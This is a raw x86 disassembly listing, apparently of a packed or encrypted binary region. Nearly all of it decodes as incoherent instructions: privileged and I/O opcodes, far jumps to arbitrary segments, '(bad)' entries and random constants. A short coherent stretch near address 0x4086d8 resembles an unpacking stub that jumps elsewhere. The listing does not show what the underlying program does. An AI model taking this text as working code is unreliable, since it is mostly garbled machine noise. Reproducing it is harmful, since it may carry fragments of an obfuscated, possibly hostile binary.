  408144:	jmp    0x2c02:0x690ed1d8
  40814b:	add    ebp,ebp
  40814d:	mul    BYTE PTR [esi+0x384917c5]
  408153:	mov    BYTE PTR [eax],ah
  408155:	inc    esp
  408156:	inc    ebp
  408157:	mov    BYTE PTR [edx-0x26],dl
  40815a:	bound  ebx,QWORD PTR [eax+0x7c]
  40815d:	stos   DWORD PTR es:[edi],eax
  40815e:	push   edx
  40815f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408160:	call   FWORD PTR [edi+ecx*4]
  408163:	fiadd  DWORD PTR [edi-0x5a]
  408166:	or     dl,BYTE PTR [ecx-0xa]
  408169:	push   ebx
  40816a:	pusha  
  40816b:	imul   edx,esi,0x385d722
  408171:	bound  ecx,QWORD PTR [ecx]
  408173:	mov    BYTE PTR [eax],al
  408175:	add    ch,al
  408177:	mov    edi,0x194d09b9
  40817c:	aas    
  40817d:	inc    esi
  40817e:	mul    DWORD PTR [esi+0x33]
  408181:	hlt    
  408182:	repz sub BYTE PTR ds:0x54a7fe06,cl
  408189:	stc    
  40818a:	mov    ds:0x3026a73f,eax
  40818f:	dec    eax
  408190:	ds push edx
  408192:	fdivr  DWORD PTR [edi-0x6d]
  408195:	inc    esi
  408196:	sbb    eax,0xe7cdc508
  40819b:	iret   
  40819c:	add    al,0x87
  40819e:	or     ah,BYTE PTR [eax+0x5]
  4081a1:	aas    
  4081a2:	fisubr DWORD PTR [edx]
  4081a4:	push   ebp
  4081a5:	aaa    
  4081a6:	pop    esp
  4081a7:	push   edx
  4081a8:	icebp  
  4081a9:	adc    eax,0xb2899ca4
  4081ae:	scas   al,BYTE PTR es:[edi]
  4081af:	cmp    al,0x3d
  4081b1:	scas   al,BYTE PTR es:[edi]
  4081b2:	xor    BYTE PTR [edi+ebp*1-0x4711e803],cl
  4081b9:	ins    BYTE PTR es:[edi],dx
  4081ba:	xchg   edx,eax
  4081bb:	mov    edx,0xedce0e70
  4081c0:	jge    0x408174
  4081c2:	cmp    ebp,DWORD PTR [edx]
  4081c4:	adc    esi,DWORD PTR [esi*4+0x66c149d4]
  4081cb:	loop   0x408159
  4081cd:	stos   BYTE PTR es:[edi],al
  4081ce:	stc    
  4081cf:	aam    0x8c
  4081d1:	add    ecx,DWORD PTR [edi+0xb]
  4081d4:	lds    esi,FWORD PTR [eax]
  4081d6:	xor    ecx,DWORD PTR [ebp+0x53]
  4081d9:	adc    BYTE PTR [edx+0x4fff5701],dh
  4081df:	test   al,0x9d
  4081e1:	shr    esi,1
  4081e3:	js     0x4081f4
  4081e5:	test   al,0xa
  4081e7:	cli    
  4081e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081e9:	jmp    0x7efef2e
  4081ee:	fs or  eax,0x8900d5bc
  4081f4:	pop    ss
  4081f5:	adc    al,0x54
  4081f7:	push   0xffffffc7
  4081f9:	clc    
  4081fa:	mov    edi,0xf8cf19a5
  4081ff:	icebp  
  408200:	mov    ebx,0x5a309e7f
  408205:	sub    eax,0x51cc4368
  40820a:	ds pop ebx
  40820c:	or     ebp,DWORD PTR [eax-0x3c]
  40820f:	mov    BYTE PTR [eax],dl
  408211:	fsubr  DWORD PTR [esp+esi*1-0x24]
  408215:	rcr    DWORD PTR [ebx],0xc2
  408218:	mov    esp,0xe9a6d7c6
  40821d:	ffree  st(5)
  40821f:	and    eax,0x3f2bb82c
  408224:	retf   0x8311
  408227:	pop    ebp
  408228:	and    eax,DWORD PTR [edi-0x3b]
  40822b:	xchg   esi,eax
  40822c:	pop    esp
  40822d:	add    eax,0xd1f1c4a1
  408232:	push   edx
  408233:	adc    DWORD PTR [esi+0x3eecb122],ecx
  408239:	addr16 fdivp st(5),st
  40823c:	rcl    BYTE PTR [bx+di-0x796b],0xad
  408242:	xor    al,0xbf
  408244:	sti    
  408245:	sete   BYTE PTR [ecx+0x5a]
  408249:	dec    ebx
  40824a:	or     ch,bh
  40824c:	into   
  40824d:	outs   dx,BYTE PTR ds:[esi]
  40824e:	in     al,dx
  40824f:	daa    
  408250:	mov    cl,0xe2
  408252:	fcomp  DWORD PTR [ecx-0x6c]
  408255:	imul   ebp,DWORD PTR [ecx-0x42],0x70
  408259:	ins    BYTE PTR es:[edi],dx
  40825a:	jbe    0x40823b
  40825c:	retf   0x4304
  40825f:	xor    DWORD PTR [ecx+ecx*2-0x34f14504],edx
  408266:	xor    DWORD PTR [ecx+0x2d],ecx
  408269:	fs cmc 
  40826b:	adc    DWORD PTR [ecx-0x3bc7c961],0x1c
  408272:	push   edx
  408273:	shl    DWORD PTR [eax],0x80
  408276:	dec    edx
  408277:	mov    esp,0xe058023c
  40827c:	inc    ebp
  40827d:	ins    BYTE PTR es:[edi],dx
  40827e:	fidivr WORD PTR [ecx+0x4a]
  408281:	inc    esp
  408282:	xor    BYTE PTR [ebx+ebx*1],ah
  408285:	pop    ds
  408286:	loop   0x40825a
  408288:	enter  0x2363,0xce
  40828c:	or     ax,0x9366
  408290:	push   esp
  408291:	add    DWORD PTR [bx+0x30],esp
  408295:	mov    WORD PTR ds:0xa10e1fe1,es
  40829b:	jl     0x408273
  40829d:	aam    0xf6
  40829f:	xchg   edx,eax
  4082a0:	fld    TBYTE PTR [edi]
  4082a2:	mov    ecx,0xc357d10d
  4082a7:	mov    ds:0xa07a4e89,eax
  4082ac:	xchg   ecx,eax
  4082ad:	lods   eax,DWORD PTR ds:[esi]
  4082ae:	aam    0x5f
  4082b0:	cmp    eax,0x5040e7a9
  4082b5:	bound  ecx,QWORD PTR [esi-0x79]
  4082b8:	out    dx,eax
  4082b9:	es pop edx
  4082bb:	and    DWORD PTR [edi+0x35],0x71
  4082bf:	nop
  4082c0:	lods   eax,DWORD PTR ds:[esi]
  4082c1:	pop    edx
  4082c2:	sub    edi,ebp
  4082c4:	jle    0x4082e4
  4082c6:	ja     0x4082a6
  4082c8:	stc    
  4082c9:	dec    eax
  4082ca:	pop    ebp
  4082cb:	cmp    al,0xb3
  4082cd:	lock sbb BYTE PTR [esi],cl
  4082d0:	cld    
  4082d1:	cmp    eax,0x83ac96d0
  4082d6:	test   eax,0xf7aa65bc
  4082db:	jecxz  0x4082da
  4082dd:	ins    BYTE PTR es:[edi],dx
  4082de:	xor    dl,BYTE PTR [edx+0x14769336]
  4082e4:	aaa    
  4082e5:	addr16 call 0x7bbcaae3
  4082eb:	pop    es
  4082ec:	scas   al,BYTE PTR es:[edi]
  4082ed:	ins    DWORD PTR es:[edi],dx
  4082ee:	or     esp,edx
  4082f0:	adc    BYTE PTR [esp+ecx*2+0x28],0xd4
  4082f5:	lock add ebx,esp
  4082f8:	dec    ebx
  4082f9:	enter  0x5be4,0x76
  4082fd:	in     al,0xb4
  4082ff:	(bad)  
  408300:	mov    WORD PTR [eax+ecx*4-0x68],cs
  408304:	shl    dh,cl
  408306:	enter  0xf746,0x2
  40830a:	cmp    dl,BYTE PTR [ecx-0x30b9e011]
  408310:	cmp    BYTE PTR [edi],dh
  408312:	xchg   ecx,eax
  408313:	adc    eax,0xfc4fe86d
  408318:	cmp    eax,0xdddc2c1
  40831d:	sub    edx,DWORD PTR [edx+0x20]
  408320:	ins    DWORD PTR es:[edi],dx
  408321:	and    eax,0xd64ecda1
  408326:	push   0x90832a49
  40832b:	sub    DWORD PTR ds:0x3d94f960,esi
  408331:	test   ah,0x5c
  408334:	js     0x4082df
  408336:	cli    
  408337:	imul   esi,DWORD PTR [ecx-0x16],0xffffff93
  40833b:	je     0x4082d2
  40833d:	xor    BYTE PTR [edi-0xb459539],ah
  408343:	aam    0x4d
  408345:	push   ebx
  408346:	xchg   edx,eax
  408347:	aad    0x3b
  408349:	(bad)  
  40834a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40834b:	dec    ebx
  40834c:	push   DWORD PTR [eax]
  40834e:	int    0x1a
  408350:	test   al,0xd9
  408352:	enter  0x4486,0x16
  408356:	push   ds
  408357:	inc    ebx
  408358:	sbb    BYTE PTR [ebx],ah
  40835a:	sar    BYTE PTR [ebx+0x4b],0xa1
  40835e:	shl    DWORD PTR [esi-0x56],0x54
  408362:	sub    al,0x94
  408364:	aad    0x11
  408366:	lahf   
  408367:	lods   eax,DWORD PTR ds:[esi]
  408368:	xchg   ecx,eax
  408369:	mov    bl,0xf8
  40836b:	add    al,0x9
  40836d:	pop    es
  40836e:	sbb    eax,0x8f695795
  408373:	shl    BYTE PTR [eax],1
  408375:	push   ecx
  408376:	mov    esi,0xeb33bad8
  40837b:	sub    BYTE PTR [eax-0x60],bh
  40837e:	les    esi,FWORD PTR [edi-0x4d]
  408381:	int3   
  408382:	cmp    al,al
  408384:	sbb    BYTE PTR [edx],cl
  408386:	pop    es
  408387:	push   eax
  408388:	jg     0x4083a4
  40838a:	mov    BYTE PTR [eax-0x17],0x2d
  40838e:	loope  0x408399
  408390:	test   BYTE PTR [eax+ecx*8+0x52dde179],dl
  408397:	mov    dl,0x25
  408399:	and    ah,BYTE PTR [esi-0x2272b7ab]
  40839f:	ins    BYTE PTR es:[edi],dx
  4083a0:	sbb    bl,BYTE PTR [eax-0xb]
  4083a3:	in     al,0xac
  4083a5:	cs cmp ebp,esi
  4083a8:	lods   al,BYTE PTR ds:[esi]
  4083a9:	mov    bl,0xa5
  4083ab:	pop    es
  4083ac:	lock push esi
  4083ae:	ins    BYTE PTR es:[edi],dx
  4083af:	inc    ebx
  4083b0:	aas    
  4083b1:	fisub  WORD PTR ds:0xbe49092
  4083b7:	dec    ecx
  4083b8:	dec    ecx
  4083b9:	pop    ecx
  4083ba:	jae    0x40843b
  4083bc:	scas   al,BYTE PTR es:[edi]
  4083bd:	push   ebx
  4083be:	pushf  
  4083bf:	inc    esp
  4083c0:	xchg   ecx,eax
  4083c1:	mov    ds:0x507241e9,al
  4083c6:	or     ch,dh
  4083c8:	in     eax,0x8e
  4083ca:	es ins BYTE PTR es:[edi],dx
  4083cc:	sahf   
  4083cd:	jle    0x408420
  4083cf:	iret   
  4083d0:	push   cs
  4083d1:	loopne 0x4083eb
  4083d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083d5:	repnz sub al,0x9f
  4083d8:	addr16 mov cl,0x73
  4083db:	adc    DWORD PTR [ebx-0x1],eax
  4083de:	cmp    DWORD PTR [esi-0xf5f032a],0x4058dece
  4083e8:	add    ecx,DWORD PTR [esi-0x52e42abf]
  4083ee:	inc    edx
  4083ef:	es cmps DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4083f2:	mov    ecx,0xe19f6562
  4083f7:	jbe    0x4083d5
  4083f9:	(bad)  
  4083fa:	push   ebp
  4083fb:	push   edi
  4083fc:	pop    edi
  4083fd:	push   cs
  4083fe:	int3   
  4083ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408400:	mov    ebp,0xd36dcc99
  408405:	push   eax
  408406:	xor    ebp,eax
  408408:	mov    al,ds:0xb99494d3
  40840d:	mov    WORD PTR [edi+0x79],es
  408410:	mov    DWORD PTR [edi+0x7],edi
  408413:	inc    ebp
  408414:	pop    edx
  408415:	jle    0xdb637215
  40841b:	out    0x54,al
  40841d:	pop    ecx
  40841f:	mov    bl,0x43
  408421:	nop
  408422:	vmread DWORD PTR [ebx-0x3bb5ebcf],ebx
  408429:	fmulp  st(0),st
  40842b:	shl    DWORD PTR [esi],cl
  40842d:	mov    ds:0x659dbd27,eax
  408432:	lahf   
  408433:	dec    edi
  408434:	cdq    
  408435:	inc    esi
  408436:	mov    bl,dh
  408438:	cmp    esp,DWORD PTR [ebx-0x72060439]
  40843e:	mov    dh,0x87
  408440:	mov    edi,0x246e7650
  408445:	es xchg edi,eax
  408447:	pop    ds
  408448:	push   edi
  408449:	push   ebx
  40844a:	ficomp DWORD PTR [ebp+0x5b]
  40844d:	add    al,0x50
  40844f:	out    0x85,eax
  408451:	jne    0x408478
  408453:	xor    al,0x41
  408455:	ss fdivp st(1),st
  408458:	and    eax,0xa8bb8da8
  40845d:	pandn  mm4,QWORD PTR [ebx+ebx*1-0x69f5bbb6]
  408465:	call   0x357f3d83
  40846a:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40846c:	fisub  DWORD PTR [eax-0x106998a1]
  408472:	pop    ebp
  408473:	retf   0x9691
  408476:	inc    eax
  408477:	ins    DWORD PTR es:[edi],dx
  408478:	fistp  DWORD PTR [edx-0x3600b263]
  40847e:	add    eax,0x394c2cc5
  408483:	aad    0xb6
  408485:	les    esi,FWORD PTR [edi-0xd40a6a7]
  40848b:	pop    esp
  40848c:	pop    edx
  40848d:	jae    0x408423
  40848f:	xchg   ebx,eax
  408490:	or     al,0x79
  408492:	dec    eax
  408493:	mov    edx,0x2d6938c4
  408498:	stos   DWORD PTR es:[edi],eax
  408499:	pop    ecx
  40849a:	push   edi
  40849b:	lods   eax,DWORD PTR ds:[esi]
  40849c:	push   ebx
  40849d:	int3   
  40849e:	mov    ds:0x8f016525,eax
  4084a3:	loop   0x40848f
  4084a5:	sti    
  4084a6:	mov    ecx,0x7299cff5
  4084ab:	rol    BYTE PTR [ebx-0x547a7157],cl
  4084b1:	stos   DWORD PTR es:[edi],eax
  4084b2:	fdivr  QWORD PTR ds:0xe9617273
  4084b8:	clc    
  4084b9:	push   cs
  4084ba:	xor    edx,edi
  4084bc:	int3   
  4084bd:	dec    edx
  4084be:	dec    edi
  4084bf:	xor    al,0xa9
  4084c1:	or     edx,DWORD PTR [ecx+0x35a90ac0]
  4084c7:	int3   
  4084c8:	mov    cl,0x53
  4084ca:	out    0x13,eax
  4084cc:	pop    ebx
  4084cd:	scas   eax,DWORD PTR es:[edi]
  4084ce:	inc    ebx
  4084cf:	adc    bh,dh
  4084d1:	fidivr WORD PTR cs:[eax+0x26]
  4084d5:	retf   0x8233
  4084d8:	or     BYTE PTR [ecx],al
  4084da:	aam    0xb3
  4084dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084dd:	adc    DWORD PTR [eax-0x20e78f75],ecx
  4084e3:	rol    BYTE PTR [eax+0x7ff853e3],1
  4084e9:	daa    
  4084ea:	mov    BYTE PTR [ecx],dl
  4084ec:	xchg   ebx,eax
  4084ed:	std    
  4084ee:	lds    esp,FWORD PTR [edi]
  4084f0:	ins    BYTE PTR es:[edi],dx
  4084f1:	in     al,0x74
  4084f3:	sub    DWORD PTR [ecx],eax
  4084f5:	wrmsr  
  4084f7:	fwait
  4084f8:	and    BYTE PTR [ecx+0x1c2a6a06],al
  4084fe:	mov    ds:0x74567c0d,al
  408503:	push   esi
  408504:	xor    dl,bh
  408506:	add    dh,BYTE PTR [edi+0x5a9ab133]
  40850c:	pop    esp
  40850d:	add    eax,0xcd46467d
  408512:	jb     0x408525
  408514:	xchg   DWORD PTR [ecx],eax
  408516:	test   eax,0x548aa1f1
  40851b:	jmp    0x45ab:0x5e642618
  408522:	sub    DWORD PTR [esi+eax*4+0x3a],ecx
  408526:	sub    al,BYTE PTR ds:0x287384e2
  40852c:	add    eax,0x8c3f276d
  408531:	mov    dh,0x7f
  408533:	lods   al,BYTE PTR ds:[esi]
  408534:	rcl    BYTE PTR [eax+edx*2+0x7f30b540],0xba
  40853c:	in     al,0xf0
  40853e:	xor    edi,DWORD PTR [eax+0x3c]
  408541:	xchg   ebp,eax
  408542:	mov    dl,0xc6
  408544:	scas   eax,DWORD PTR es:[edi]
  408545:	jp     0x40855c
  408547:	adc    ebx,edx
  408549:	jo     0x4085bc
  40854b:	and    edx,DWORD PTR [eax-0x67]
  40854e:	leave  
  40854f:	js     0x4084fa
  408551:	sbb    al,BYTE PTR [ecx-0x6befb526]
  408557:	lock mov ebx,edi
  40855a:	sub    al,0x84
  40855c:	mov    ch,ah
  40855e:	icebp  
  40855f:	shl    DWORD PTR [ebp+0x15],cl
  408562:	jle    0x4084e9
  408564:	push   ebp
  408565:	push   es
  408566:	push   esp
  408567:	jne    0x40859c
  408569:	mov    esi,0xe456371a
  40856e:	mov    ds:0x4f024d59,eax
  408573:	lahf   
  408574:	inc    BYTE PTR [edi]
  408576:	sbb    edi,edi
  408578:	mov    WORD PTR [edx],ds
  40857a:	test   DWORD PTR [ebx],edi
  40857c:	push   ecx
  40857d:	jns    0x4085c5
  40857f:	cmp    BYTE PTR [edx-0x145e1bb5],dh
  408585:	gs icebp 
  408587:	psubusw mm4,mm7
  40858a:	pop    ss
  40858b:	pop    esp
  40858c:	add    DWORD PTR [edi-0x3e0e5d4],esi
  408592:	into   
  408593:	popf   
  408594:	xor    eax,DWORD PTR [edx]
  408596:	div    eax
  408598:	test   al,0xa0
  40859a:	ss or  eax,0x2fe4bd21
  4085a0:	jae    0x4085f1
  4085a2:	cli    
  4085a3:	mov    ebx,esp
  4085a5:	push   eax
  4085a6:	outs   dx,DWORD PTR ds:[esi]
  4085a7:	stc    
  4085a8:	(bad)  
  4085a9:	and    BYTE PTR [ebp-0xe],al
  4085ac:	test   eax,0x4b746211
  4085b1:	inc    edx
  4085b2:	pop    esp
  4085b3:	scas   eax,DWORD PTR es:[edi]
  4085b4:	dec    edi
  4085b5:	das    
  4085b6:	push   edx
  4085b7:	mov    ?,WORD PTR [esi]
  4085b9:	test   DWORD PTR [edi],ecx
  4085bb:	test   dl,cl
  4085bd:	fs mov bh,0x88
  4085c0:	popf   
  4085c1:	jb     0x4085a1
  4085c3:	xchg   ebp,eax
  4085c4:	cmp    ebp,esp
  4085c6:	test   eax,0x53146856
  4085cb:	(bad)  
  4085cc:	js     0x4085f0
  4085ce:	scas   eax,DWORD PTR es:[edi]
  4085cf:	pop    ebp
  4085d0:	push   es
  4085d1:	aas    
  4085d2:	push   esi
  4085d3:	cmp    DWORD PTR [ebx-0x7bb33a38],ebx
  4085d9:	xor    esi,DWORD PTR [edx+0x68]
  4085dc:	imul   esp,DWORD PTR [edi],0xc11255a0
  4085e2:	add    DWORD PTR [eax],edi
  4085e4:	sub    al,0x67
  4085e6:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085e8:	fist   WORD PTR [esi]
  4085ea:	sbb    eax,0xdacdb943
  4085ef:	jmp    0x4428:0xd84eeec2
  4085f6:	(bad)
  4085fa:	cmp    eax,0x14286c5c
  4085ff:	test   BYTE PTR [ebp-0x2b],0xfe
  408603:	arpl   WORD PTR [ebx+0x79],si
  408606:	and    BYTE PTR ds:0xb65674ed,0x93
  40860d:	jmp    0x75bc:0xea2555f9
  408614:	mov    esp,DWORD PTR [esi]
  408616:	arpl   WORD PTR [ecx],dx
  408618:	outs   dx,DWORD PTR ds:[esi]
  408619:	add    al,0xb5
  40861b:	and    ebp,ebx
  40861d:	and    edx,ebx
  40861f:	cmp    edi,ebx
  408621:	or     dl,BYTE PTR [ecx+0x63be6451]
  408627:	test   eax,0x7a993271
  40862c:	xchg   ecx,eax
  40862d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40862e:	shl    DWORD PTR [ebx],1
  408630:	out    0xfb,eax
  408632:	sbb    BYTE PTR [eax],dl
  408634:	xlat   BYTE PTR ds:[ebx]
  408635:	retf   
  408636:	jo     0x408663
  408638:	enter  0x255e,0xd0
  40863c:	xlat   BYTE PTR ds:[ebx]
  40863d:	nop
  40863e:	in     eax,0xe7
  408640:	test   al,0xfc
  408642:	gs mov edi,0xdd277fc8
  408648:	mov    al,0x2f
  40864a:	sti    
  40864b:	add    ebp,DWORD PTR [eax-0x33decadd]
  408651:	pop    edx
  408652:	sbb    esp,DWORD PTR [ebx+0x36d8ef07]
  408658:	nop
  408659:	sbb    DWORD PTR [ecx-0x23],eax
  40865c:	xchg   ebp,eax
  40865d:	(bad)  
  40865e:	repz and eax,0xf032a3a
  408664:	jg     0x40867d
  408666:	inc    ecx
  408667:	sbb    ebp,DWORD PTR [esi+0x30bde20e]
  40866d:	mov    dh,0x70
  40866f:	cmp    eax,0x625072ad
  408674:	xor    DWORD PTR [esi+0x32],ecx
  408677:	inc    eax
  408678:	inc    ecx
  408679:	lds    edi,FWORD PTR [ebx+0x45]
  40867c:	(bad)  
  40867d:	mov    bl,0x9
  40867f:	loope  0x40869e
  408681:	mov    bh,0x9c
  408683:	movzx  ebx,WORD PTR [ecx]
  408686:	lock mov edi,0x9868dc10
  40868c:	mov    edx,esp
  40868e:	(bad)  
  40868f:	jns    0x408651
  408691:	or     ecx,DWORD PTR [eax]
  408693:	xor    ebp,DWORD PTR [esi]
  408695:	dec    eax
  408696:	and    dl,BYTE PTR [edx+0x36631ff2]
  40869c:	mov    esp,0x60a975f6
  4086a1:	fild   QWORD PTR ds:0x162a46e
  4086a7:	adc    esi,DWORD PTR gs:[eax+0x48]
  4086ab:	sahf   
  4086ac:	xor    edx,edx
  4086ae:	cs pop ds
  4086b0:	mov    ebx,0xeff41d15
  4086b5:	mov    ebp,0x64b80244
  4086ba:	sbb    cl,dh
  4086bc:	shl    BYTE PTR [eax],cl
  4086be:	or     BYTE PTR [ebx-0xc],al
  4086c1:	push   eax
  4086c2:	ret    
  4086c3:	mov    edi,eax
  4086c5:	pop    es
  4086c6:	sar    DWORD PTR [esi-0x4ad08672],0x24
  4086cd:	jmp    0x4086b4
  4086cf:	mov    bl,0xf3
  4086d1:	stos   BYTE PTR es:[edi],al
  4086d2:	outs   dx,DWORD PTR ds:[esi]
  4086d3:	xchg   BYTE PTR [esi],dl
  4086d5:	rcl    ebx,1
  4086d7:	dec    esp
  4086d8:	push   0x3
  4086da:	xor    edx,edx
  4086dc:	pop    edx
  4086dd:	add    edx,0x8
  4086e0:	push   edx
  4086e1:	pop    ecx
  4086e2:	push   0x6
  4086e4:	dec    ecx
  4086e5:	pop    ebx
  4086e6:	dec    ebx
  4086e7:	xchg   ebx,ecx
  4086e9:	sub    ebx,ecx
  4086eb:	xchg   ebx,ecx
  4086ed:	dec    ecx
  4086ee:	mov    eax,DWORD PTR [ebp-0x1c]
  4086f1:	imul   eax,ecx
  4086f4:	sub    esp,eax
  4086f6:	mov    DWORD PTR [ebp-0x20],esp
  4086f9:	mov    eax,DWORD PTR [ebp-0x4]
  4086fc:	mov    ecx,0x7510893
  408701:	jmp    0x40aa90
  408706:	dec    edi
  408707:	mov    al,0x72
  408709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40870a:	mov    cl,0x64
  40870c:	mov    ds:0xbf3f0e63,eax
  408711:	mov    eax,0x4f654ae0
  408716:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408717:	sbb    BYTE PTR [edx+0x62],ah
  40871a:	adc    BYTE PTR [edi+0x62],bl
  40871d:	bound  edx,QWORD PTR [ebx+0xa]
  408720:	stc    
  408721:	jo     0x40870f
  408723:	mov    al,ds:0xd03b0b1d
  408728:	pop    ds
  408729:	dec    eax
  40872a:	pop    eax
  40872b:	inc    edi
  40872c:	loopne 0x408764
  40872e:	xchg   esp,eax
  40872f:	and    al,0xc8
  408731:	hlt    
  408732:	std    
  408733:	mov    cl,0x77
  408735:	push   ecx
  408736:	retf   
  408737:	sbb    DWORD PTR [edx+edx*4+0xf],edx
  40873b:	or     al,0x4b
  40873d:	jnp    0x408714
  40873f:	cmp    BYTE PTR [ebx+0x2ef5cf82],dh
  408745:	or     eax,0xd56697eb
  40874a:	sti    
  40874b:	or     al,0xa1
  40874d:	fdiv   DWORD PTR [ecx+0x64]
  408750:	pop    ds
  408751:	rcl    DWORD PTR [edi+edi*1-0x5],0x9d
  408756:	lds    ebx,FWORD PTR [eax]
  408758:	add    eax,0xfa91c41d
  40875d:	test   dl,cl
  40875f:	cmp    DWORD PTR [ebx-0x510c3a62],0xac28447f
  408769:	mov    bl,0x6d
  40876b:	into   
  40876c:	stos   BYTE PTR es:[edi],al
  40876d:	sahf   
  40876e:	inc    esp
  40876f:	sub    DWORD PTR [ecx],esp
  408771:	into   
  408772:	fdiv   DWORD PTR [esp+eiz*8+0x9608125]
  408779:	rcl    ebx,0xd5
  40877c:	ja     0x4087d4
  40877e:	enter  0x6123,0x90
  408782:	xchg   ecx,eax
  408783:	cli    
  408784:	dec    edx
  408785:	loope  0x4087cc
  408787:	xor    eax,0xc6157cb0
  40878c:	(bad)  
  40878d:	jns    0x408720
  40878f:	ins    DWORD PTR es:[edi],dx
  408790:	sub    BYTE PTR [esi+ecx*2-0x1b300be7],dh
  408797:	lods   eax,DWORD PTR ds:[esi]
  408798:	gs mov ecx,ecx
  40879b:	int    0xbc
  40879d:	jmp    0x38aa:0x475cf3c7
  4087a4:	sub    al,0xcd
  4087a6:	test   BYTE PTR [ecx],ch
  4087a8:	jp     0x4087e3
  4087aa:	mov    al,0x3a
  4087ac:	shl    BYTE PTR [edx],cl
  4087ae:	out    dx,al
  4087af:	dec    esi
  4087b0:	push   esp
  4087b1:	shl    DWORD PTR [eax],1
  4087b3:	mov    edi,0x6ee4c5da
  4087b8:	js     0x4087bc
  4087ba:	pushf  
  4087bb:	rcr    ah,cl
  4087bd:	jle    0x408800
  4087bf:	sbb    eax,0xeb37030f
  4087c4:	mov    ecx,0x4999b058
  4087c9:	pushf  
  4087ca:	pop    ds
  4087cb:	mov    ebp,0x159087b6
  4087d0:	jnp    0x40876c
  4087d2:	xchg   ebp,eax
  4087d3:	jno    0x40882a
  4087d5:	jmp    0xc4e0f075
  4087da:	push   ecx
  4087db:	mov    sp,WORD PTR [ecx+0x58cd12eb]
  4087e2:	(bad)  
  4087e3:	jl     0x408799
  4087e5:	dec    ebp
  4087e6:	retf   
  4087e7:	mov    ch,0x75
  4087e9:	pop    ds
  4087ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087eb:	fadd   QWORD PTR [edi+0x24]
  4087ee:	sub    dl,BYTE PTR [edi+0x33eff102]
  4087f4:	iret   
  4087f5:	push   es
  4087f6:	or     ah,ch
  4087f8:	cmp    al,0xbe
  4087fa:	push   ebp
  4087fb:	mov    al,0x65
  4087fd:	mov    esi,0x4435b38
  408802:	(bad)  
  408804:	add    al,BYTE PTR [ebp-0x7d8f9a01]
  40880a:	adc    bl,BYTE PTR [eax+ebx*2-0x58]
  40880e:	sbb    DWORD PTR [edi-0x75],eax
  408811:	cmp    ch,dl
  408813:	ins    DWORD PTR es:[edi],dx
  408814:	retf   0x5ffa
  408817:	mov    esp,0xabc47d2
  40881c:	sub    BYTE PTR [eax-0x61],cl
  40881f:	inc    esp
  408820:	imul   ch
  408822:	fst    DWORD PTR [ebx]
  408824:	cli    
  408825:	add    al,0xca
  408827:	xchg   esi,eax
  408828:	sahf   
  408829:	and    dh,al
  40882b:	lahf   
  40882c:	pop    ebp
  40882d:	adc    al,0x8d
  40882f:	cmp    eax,0x7b1a2364
  408834:	ins    DWORD PTR es:[edi],dx
  408835:	(bad)  
  408836:	enter  0x88a8,0x6c
  40883a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40883b:	mov    esi,0x2556b748
  408840:	lahf   
  408841:	test   esp,ecx
  408843:	push   0xffffffc2
  408845:	jbe    0x4087e4
  408847:	inc    ebp
  408848:	add    eax,0xcc2265c5
  40884d:	jae    0x40888c
  40884f:	xchg   edx,eax
  408850:	mov    ah,0x72
  408852:	push   edx
  408853:	out    dx,al
  408854:	xchg   edx,eax
  408855:	adc    eax,0xfba5abf7
  40885a:	and    bl,BYTE PTR [esi-0x27]
  40885d:	adc    ebp,DWORD PTR [esi+edx*4-0x1831e876]
  408864:	(bad)  
  408865:	dec    ecx
  408866:	lods   eax,DWORD PTR ds:[esi]
  408867:	jmp    0x9b7c:0x64465798
  40886e:	div    ah
  408870:	test   esi,eax
  408872:	jle    0x408853
  408874:	aad    0x30
  408876:	push   0x4448d7ab
  40887b:	cwde   
  40887c:	ja     0x4088e4
  40887e:	mov    cl,0x44
  408880:	push   edi
  408881:	mov    edi,0xb9219e81
  408886:	mov    edx,eax
  408888:	fistp  DWORD PTR [ecx]
  40888a:	popf   
  40888b:	test   al,0xab
  40888d:	inc    edi
  40888e:	repz or BYTE PTR ss:[ebx-0x6],dh
  408893:	mov    esi,cs
  408895:	mov    dl,0x7b
  408897:	scas   al,BYTE PTR es:[edi]
  408898:	xor    DWORD PTR [eax],eax
  40889a:	and    al,0x35
  40889c:	call   0x6bc3856a
  4088a1:	pop    ebx
  4088a2:	int    0xb3
  4088a4:	mov    esi,0x693640f0
  4088a9:	(bad)  
  4088aa:	in     eax,0x31
  4088ac:	inc    eax
  4088ad:	inc    ebp
  4088ae:	jg     0x4088dd
  4088b0:	dec    ecx
  4088b1:	push   0x5f
  4088b3:	push   ebx
  4088b4:	jo     0x4088c4
  4088b6:	in     al,dx
  4088b7:	(bad)  
  4088b8:	loop   0x40887b
  4088ba:	push   ebp
  4088bb:	add    DWORD PTR ss:[edx-0x6d],ebp
  4088bf:	out    dx,al
  4088c0:	sub    al,dh
  4088c2:	(bad)  
  4088c3:	fisubr WORD PTR [eax-0x12]
  4088c6:	push   esp
  4088c7:	fist   DWORD PTR [edx+esi*4-0x62]
  4088cb:	xchg   DWORD PTR [edi],edi
  4088cd:	pushf  
  4088ce:	mov    ds:0x9bc87f22,al
  4088d3:	nop
  4088d4:	outs   dx,DWORD PTR ds:[esi]
  4088d5:	xchg   edi,eax
  4088d6:	mov    al,0x85
  4088d8:	or     al,bh
  4088da:	icebp  
  4088db:	mov    ah,0x38
  4088dd:	shl    esp,0x11
  4088e0:	jns    0x40886b
  4088e2:	mov    edi,edi
  4088e4:	shr    DWORD PTR [edi+edi*2],1
  4088e7:	adc    ah,ah
  4088e9:	js     0x4088c9
  4088eb:	cld    
  4088ec:	mov    bl,BYTE PTR [edx+0x19dfa87a]
  4088f2:	out    0x44,al
  4088f4:	outs   dx,BYTE PTR ds:[esi]
  4088f5:	js     0x4088ee
